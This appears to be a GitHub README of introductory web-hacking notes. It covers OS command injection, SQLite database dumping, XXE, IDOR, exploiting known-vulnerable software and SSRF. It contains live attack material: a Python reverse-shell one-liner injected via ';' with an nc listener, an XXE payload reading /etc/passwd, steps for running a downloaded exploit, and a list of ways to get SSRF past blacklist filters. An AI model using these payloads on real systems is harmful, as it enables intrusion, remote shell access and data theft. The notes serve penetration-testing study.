 #                                         💪 ` Web-Vulnerabilites ` 💪




## 🥇01. OS Command Injection :

![command-injection-vulnerability](https://user-images.githubusercontent.com/55437834/116801682-d6c45080-ab2d-11eb-8c38-cae9126833af.jpg)


### What is OS Command Injection ?

OS Command Injection is server side  web vulnerablities where attacker execute :eyes:" system command"  like id, whoami ,uname etc os command  .
It is a web vulnerability that allows an attacker to take advantage of that made system call to execute operating system commands on the server.


### Types Of OS Commnad Injection :

                                  There are two types of OS command injection  such as :
                                                                           
                                                                                        i. Active OS command injection
                                
                                                                                        ii. Blind OS command injection
                                                                                       

### Active OS Command Injection :


Active command injection will return the response to the user.  It can be made visible through several HTML elements. That means when a attacker execute :eyes: "system command "  like ls ,server will return result of ls .(Attacker will see the result of ls ) .It is so easy to execute . 


### Blind OS Command Injection :
      
Blind command injection occurs when the system command made to the server does not return the response to the user in the HTML document . That means when a  attacker execute " system command "  like ls ,server will not return result of ls but  server execute ls command . For  , seeing the result of :eyes: "system command " you must upload reverse shell on target / victim server . After uploading  reverse shell on victim server , you must be  listen uploaded shell on attacker terminal using nc command . 


### Example :
         
        ♥️  1. upload reverse shell :
                                  ; python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'

           2. listen reverse shell :

                                 nc -lnvp 4242

Note : 
           
       1. Change ip according to your local host ip
        
       2. One can easily  uploaded  shell if OS command injection is occured .
              

# 🥈02. Sqlite3 or "flat-file" :

When databases stored as a file it's called "flat-file"  .The extension of those file is db . ( like webapp.db , base.db )

Process :

               1.  At first   download  " flat-file " from target web app  . ( Use dirsearch or gobuster for exposing  flat-file directory )

               2.  Then  , expose sensitve data from "flat-file "  using sqlite3 


Use Of Sqlite3 :

                       sqlite3 target_file 

                      .help 

                      .tables

                      .schema table_name

                      select * from table_name ;  // see more //
                      
                
# 🥉03. XML OR XML External Entity OR XXE :

![XXE-banner-1024x536-1-1024x536](https://user-images.githubusercontent.com/55437834/116801699-ff4c4a80-ab2d-11eb-80b6-af5d72d7ff85.jpg)


An XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data.

#### :-1:Disadvantage of XML attack :
                                           
                                           1. Cause of  Denial of Service (DoS) attack

                                           2. Could use XXE to perform Server-Side Request Forgery (SSRF) 

                                           3.  XXE may even enable port scanning and lead to remote code execution.

#### There are Two types of XXE attacks :
                          
                                                      1. in-band xxe
                                                      
                                                      2.out-of-band xxe

1) An in-band XXE attack is the one in which the attacker can receive an immediate response to the XXE payload.

2) out-of-band XXE attacks (also called blind XXE), there is no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.


##### :pray:Note : For better understanding you need to learn basic of XML language 

### 👀 XXE Payload :

Now we'll see some XXE payload and see how they are working.

1) The first payload we'll see is very simple. If you've read the previous task properly then you'll understand this payload very easily.

         <!DOCTYPE replace [<!ENTITY name "feast"> ]>
         <userInfo>
           <firstName>falcon</firstName>
           <lastName>&name;</lastName>
         </userInfo>



As we can see we are defining a ENTITY called name and assigning it a value feast. Later we are using that ENTITY in our code.

2) We can also use XXE to read some file from the system by defining an ENTITY and having it use the SYSTEM keyword

         <?xml version="1.0"?>
         <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
         <root>&read;</root>

Here again, we are defining an ENTITY with the name read but the difference is that we are setting it value to `SYSTEM` and path of the file.

If we use this payload then a website vulnerable to XXE(normally) would display the content of the file /etc/passwd.

In a similar manner, we can use this kind of payload to read other files but a lot of times you can fail to read files in this manner or the reason for failure could be the file you are trying to read.


# 🔊04.Broken Access -IDOR :

![116019462_282530606501791_5738413798267894160_n](https://user-images.githubusercontent.com/55437834/116801663-a977a280-ab2d-11eb-9b3d-b002ec8099e5.png)


##### IDOR, or Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled, to access resources you wouldn't ordinarily be able to access. IDOR is a type of access control vulnerability.

For example, let's say we're logging into our bank account, and after correctly authenticating ourselves, we get taken to a URL like this https://example.com/bank?account_number=1234. On that page we can see all our important bank details, and a user would do whatever they needed to do and move along their way thinking nothing is wrong.

There is however a potentially huge problem here, a hacker may be able to change the account_number parameter to something else like 1235, and if the site is incorrectly configured, then he would have access to someone else's bank information.


### 👁️ Conclusion of IDOR : When  you change the value of (get /post) parameter  , you will see other user information .



# 🧚‍♂️05. Components With Known Vulnerabilities :

* Occasionally, you may find that the company/entity that you're pen-testing is using a program that already has a well documented vulnerability.

* For example, let's say that a company hasn't updated their version of WordPress for a few years, and using a tool such as wpscan, you find that it's version 4.6. Some quick research will reveal that WordPress 4.6 is vulnerable to an unauthenticated remote code execution(RCE) exploit, and even better you can find an exploit already made on exploit-db.


Process :

           1. Analize target website and  findout version , name etc of target platform .

           2. Then , checkout those versuon ,name are vulnerable or not  via exploit db ,rapid7  etc .

           3. If target webiste version is vulnerable  you can easily hacked your targer website via those process .

#### Example :

Suppose  , Our  target website   like this :


After analyzing  , we realize that  our target  website create by "Nostromo"  .  Ok  , thats great  .Now ,follow our previous process :

1. Search  "Nostromo" on exploit db 

2. find out specific exploitation according to our target version (Here  , nostromo 1.9.6 )

3. Then , Download exploit file and  execute it

#### Command :
          download_file.py target_url  id 

Here , you can use any linux os command instead of id 

# 🐞 SSRF(Sever Side Request Forgery ) :

![server-side-request-forgery-vulnerability-ssrf](https://user-images.githubusercontent.com/55437834/116801458-070aef80-ab2c-11eb-8860-23590d56bd1a.jpg)


### What is SSRF ?
#### Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing .

#### Simply , SSRF is a web vulnerability which help an attacker to get / gain information from target server . Attacker  can gain any  Data from Sever  for that It's called Server Side Request Forgery .

## What is the impact of SSRF attacks?

1. Attacker can unauthorized action or access
2. Attacke can see any data of server
3. Attacker can execute 3rd party mallicious website

## 👽 How One Can  Find SSRF :

Step 1 :
        At first findout any get parameter that is use for data loaded ( Like url,data,id  )
Suppose , you have this website http://ptc-b59f8e4f-a516ccb2.libcurl.so/ 

After  , recon you find get parameter of this website http://ptc-b59f8e4f-a516ccb2.libcurl.so/?url

Now , you can test LFI, RFI And SSRF on this  website 

Step 2:
       Use loopback ip after target url and use port number
       
      http://ptc-b59f8e4f-a516ccb2.libcurl.so/?url=http://127.0.0.1:1234
      
You will see information of 1234 port 

##### 👀 Note : Developer can whitelist and blacklist for our input 

## 🔥 Bypassing SSRF Protection :

There are two main types of SSRF protection mechanisms out there:
                                                    
                                                    blacklists and
                                                    whitelists

Blacklists refer to the practice of not allowing certain addresses and blocking the request if a blacklisted address was received as input. Most SSRF protection takes the form of blacklisting internal network address blocks.
      
      
On the other hand, whitelists mean that a server would only allow through requests that contain URLs on a prespecified list and fail all other requests

### 📷 Bypassing Blacklists :
                      1.Try using IPv6 addresses instead of IPv4
                      2.Use Hex Encoding instead of Decimal number (http://0x7f.0x0.0x0.0x1)
                      3.Use Octal Encoding insted of Decimal number (http://0177.0.0.01)
                      4.Use Dword Encodinf( http://2130706433)
                      5.Use URL Encoding (%6c%6f%63%61%6c%68%6f%73%74)
                      6.Use Mixed Encoding (0177.0.0.0x1)
                      7.Tricking it with DNS
                      8.Fooling it with redirects
                      9.Use localhost instead of 127.0.01 (http://localhost:1234)
                      
#### Practice Website Link :
                       
                       level 1:http://ptc-e5e344a9-ab23ba80.libcurl.so/?url=https://assets.pentesterlab.com/hacker.txt
                       level 2:http://ptc-a04fcdce-f9f12764.libcurl.so/?url=https://assets.pentesterlab.com/hacker.txt
                       level 3:http://ptc-b59f8e4f-a516ccb2.libcurl.so/?url=https://assets.pentesterlab.com/hacker.txt
                       level 4:http://ptc-50a250d6-842795bb.libcurl.so/?url=https://assets.pentesterlab.com/hacker.txt
                       
#### Resoures Link :
               
               1.https://portswigger.net/web-security/ssrf ( Theory about SSRF)
               2.https://vickieli.medium.com/bypassing-ssrf-protection-e111ae70727b (Bypass )
               3.https://pravinponnusamy.medium.com/ssrf-payloads-f09b2a86a8b4    (Bypass Payload List )
                        
### 😍Happy Hacking 😍
